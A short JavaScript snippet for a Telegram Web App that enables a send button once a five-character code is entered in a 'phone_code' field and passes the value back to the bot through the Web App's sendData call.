let tg = window.Telegram.WebApp;
tg.expand();

phone = document.getElementById('phone_code') ;
send_btn = document.getElementById('send-button');

function CheckIf(){
    console.log(phone.value.length);
    if (phone.value.length == 5){
       send_btn.disabled = false;
    }
    else{
        send_btn.disabled = true;
    }
}

send_btn.addEventListener('click',function(){
    console.log('as');
    tg.sendData(phone.value);
    
});